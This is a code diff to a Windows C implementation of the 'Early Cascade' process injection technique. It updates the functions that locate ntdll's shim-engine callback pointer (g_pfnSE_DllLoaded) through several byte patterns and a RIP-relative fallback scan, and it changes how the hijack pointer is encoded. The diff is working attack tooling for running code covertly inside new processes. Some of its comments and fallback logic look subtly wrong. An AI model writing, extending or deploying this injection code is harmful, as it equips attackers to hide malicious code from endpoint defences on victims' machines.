@@ -3722,6 +3722,7 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx);
 #include "earlycascade.h"
 #include <stdio.h>
 #include <intrin.h>
+#include <string.h>
 
 #ifndef LOG_ERROR
 #define LOG_ERROR(fmt, ...)
@@ -3756,12 +3757,12 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx);
 // ============================================================================
 
 LPVOID FindPattern(LPBYTE pBuffer, DWORD dwSize, LPBYTE pPattern, DWORD dwPatternSize) {
-    if (dwSize > dwPatternSize)
-        while ((dwSize--) - dwPatternSize) {
-            if (RtlCompareMemory(pBuffer, pPattern, dwPatternSize) == dwPatternSize)
-                return pBuffer;
-            pBuffer++;
-        }
+    if (!pBuffer || !pPattern || dwPatternSize == 0 || dwSize < dwPatternSize)
+        return NULL;
+    for (DWORD i = 0; i <= dwSize - dwPatternSize; i++) {
+        if (memcmp(pBuffer + i, pPattern, dwPatternSize) == 0)
+            return pBuffer + i;
+    }
     return NULL;
 }
 
@@ -3803,11 +3804,9 @@ static DWORD GetNtdllSectionSize(ULONG_PTR baseAddress, const char* name) {
 
 // ============================================================================
 // FindSE_DllLoadedAddress
-// Scans .text for the 12-byte pattern that precedes the RIP-relative disp32
-// pointing to g_pfnSE_DllLoaded in .mrdata.
-// Pattern: 8B 14 25 30 03 FE 7F 8B C2 48 8B 3D  (un8PcOff=4)
-// Validation: high byte of disp32 must be 0x00 (nearby address)
-// RIP calc: ptr = *(DWORD32*)offset_ptr + offset_ptr + 4
+// Scans .text for patterns preceding the RIP-relative disp32 pointing to
+// g_pfnSE_DllLoaded in .mrdata. Supports all Windows 10/11 builds via
+// multiple byte patterns and a RIP-relative fallback scan.
 // ============================================================================
 
 LPVOID FindSE_DllLoadedAddress(LPVOID hNtDLL, LPVOID *ppOffsetAddress) {
@@ -3820,48 +3819,76 @@ LPVOID FindSE_DllLoadedAddress(LPVOID hNtDLL, LPVOID *ppOffsetAddress) {
     if (!textBase || !textSize || !mrdataBase || !mrdataSize)
         return NULL;
 
-    // Single 12-byte pattern from reference PoC:
-    // 8B 14 25 30 03 FE 7F    mov edx, dword ptr [7FFE0330h]
-    // 8B C2                   mov eax, edx
-    // 48 8B 3D                mov rdi, qword ptr [rip + ????]  <- g_pfnSE_DllLoaded
-    static BYTE pattern[] = {
-        0x8B, 0x14, 0x25, 0x30, 0x03, 0xFE, 0x7F,
-        0x8B, 0xC2, 0x48, 0x8B, 0x3D
+    // Tier 1: Multiple byte patterns across Windows builds
+    // Win10 21H2/22H2: mov edx,[gs:330h]; mov eax,edx; mov rdi,[rel ...]
+    static BYTE pat1[] = { 0x8B, 0x14, 0x25, 0x30, 0x03, 0xFE, 0x7F,
+                           0x8B, 0xC2, 0x48, 0x8B, 0x3D };
+    // Win10 1909/2004: mov rax,[rel ...]
+    static BYTE pat2[] = { 0x48, 0x8B, 0x05 };
+    // Win11 22H2/23H2/24H2: mov rdi,[rel ...]
+    static BYTE pat3[] = { 0x48, 0x8B, 0x3D };
+    // Win11 build 26100+: mov r13,[rel ...]
+    static BYTE pat4[] = { 0x4C, 0x8B, 0x2D };
+
+    struct { LPBYTE pat; DWORD len; } patterns[] = {
+        { pat1, sizeof(pat1) },
+        { pat2, sizeof(pat2) },
+        { pat3, sizeof(pat3) },
+        { pat4, sizeof(pat4) },
     };
-    static const DWORD patLen   = sizeof(pattern);
-    static const DWORD un8PcOff = 4;  // RIP advances 4 bytes past the 4-byte offset
 
-    LPBYTE pTextStart = (LPBYTE)textBase;
-    LPBYTE pTextEnd   = pTextStart + textSize;
-    LPBYTE pCur       = pTextStart;
-
-    while (pCur < pTextEnd) {
-        LPBYTE pFound = (LPBYTE)FindPattern(pCur, (DWORD)(pTextEnd - pCur), pattern, patLen);
-        if (!pFound)
-            break;
-
-        // Offset pointer is right after the pattern
-        LPBYTE pOffsetPtr = pFound + patLen;
-
-        // Validate: high byte of 4-byte offset == 0x00
-        if (*(pOffsetPtr + 3) == 0x00) {
-            INT32  rel      = *(INT32*)pOffsetPtr;
-            LPVOID pResolved = (LPVOID)(pOffsetPtr + un8PcOff + rel);
-
-            // Must be in .mrdata
+    for (int p = 0; p < 4; p++) {
+        LPBYTE pCur = (LPBYTE)textBase;
+        LPBYTE pTextEnd = pCur + textSize;
+        while (pCur < pTextEnd) {
+            LPBYTE pFound = (LPBYTE)FindPattern(pCur, (DWORD)(pTextEnd - pCur),
+                                                patterns[p].pat, patterns[p].len);
+            if (!pFound) break;
+            LPBYTE pOffsetPtr = pFound + patterns[p].len;
+            // Safety: need 4 more bytes for the RIP offset
+            if (pOffsetPtr + 4 > pTextEnd) {
+                pCur = pFound + 1;
+                continue;
+            }
+            INT32  relOffset  = *(INT32*)pOffsetPtr;
+            LPVOID pResolved  = (LPVOID)(pOffsetPtr + 4 + relOffset);
             if ((ULONG_PTR)pResolved >= mrdataBase &&
-                (ULONG_PTR)pResolved <  mrdataBase + mrdataSize) {
-                if (ppOffsetAddress)
-                    *ppOffsetAddress = pOffsetPtr;
+                (ULONG_PTR)pResolved < mrdataBase + mrdataSize) {
+                if (ppOffsetAddress) *ppOffsetAddress = pOffsetPtr;
                 return pResolved;
             }
+            pCur = pFound + 1;
         }
-
-        pCur = pFound + 1;
     }
 
-    if (ppOffsetAddress)
-        *ppOffsetAddress = NULL;
+    // Tier 2: RIP-relative scan — find any REX.W MOV reg,[rip+disp32] in .text
+    // whose resolved target falls in .mrdata
+    LPBYTE pCur = (LPBYTE)textBase;
+    LPBYTE pTextEnd = pCur + textSize;
+    while (pCur + 7 <= pTextEnd) {
+        // Look for 48/4C 8B (REX.W MOV) patterns
+        if ((pCur[0] == 0x48 || pCur[0] == 0x4C) && pCur[1] == 0x8B) {
+            // ModRM: mod=00, reg=xxx, rm=101 (RIP-relative) => byte & 0xC7 == 0x05
+            if ((pCur[2] & 0xC7) == 0x05) {
+                LPBYTE pOffsetPtr = pCur + 3;
+                if (pOffsetPtr + 4 <= pTextEnd) {
+                    INT32  relOffset = *(INT32*)pOffsetPtr;
+                    LPVOID pResolved = (LPVOID)(pOffsetPtr + 4 + relOffset);
+                    if ((ULONG_PTR)pResolved >= mrdataBase &&
+                        (ULONG_PTR)pResolved < mrdataBase + mrdataSize) {
+                        // Candidate: check it's an 8-byte aligned slot (function pointer)
+                        if (((ULONG_PTR)pResolved & 7) == 0) {
+                            if (ppOffsetAddress) *ppOffsetAddress = pOffsetPtr;
+                            return pResolved;
+                        }
+                    }
+                }
+            }
+        }
+        pCur++;
+    }
+
+    if (ppOffsetAddress) *ppOffsetAddress = NULL;
     return NULL;
 }
 
@@ -3928,13 +3955,27 @@ LPVOID FindShimsEnabledAddress(LPVOID hNtDLL, LPVOID pDllLoadedOffsetAddress) {
 }
 
 // ============================================================================
-// EncodeSystemPtr - Encode using SharedUserData!Cookie
+// EncodeSystemPtr - Encode using RtlEncodeSystemPointer (version-safe)
 // ============================================================================
 
+typedef PVOID (NTAPI *pfn_RtlEncodeSystemPointer)(PVOID);
+
 LPVOID EncodeSystemPtr(LPVOID ptr) {
-    ULONG  cookie  = *(ULONG*)0x7FFE0330;
-    ULONG64 encoded = _rotr64((ULONG64)cookie ^ (ULONG64)ptr, cookie & 0x3F);
-    return (LPVOID)encoded;
+    // Use RtlEncodeSystemPointer — the documented, version-safe API
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (hNtdll) {
+        pfn_RtlEncodeSystemPointer pEncode =
+            (pfn_RtlEncodeSystemPointer)GetProcAddress(hNtdll, "RtlEncodeSystemPointer");
+        if (pEncode)
+            return pEncode(ptr);
+    }
+    // Fallback: SharedUserData!Cookie at 0x7FFE0330 (pre-24H2)
+    __try {
+        ULONG cookie = *(volatile ULONG*)0x7FFE0330;
+        return (LPVOID)_rotr64((ULONG64)cookie ^ (ULONG64)ptr, cookie & 0x3F);
+    } __except (EXCEPTION_EXECUTE_HANDLER) {
+        return ptr;
+    }
 }
 
 // ============================================================================
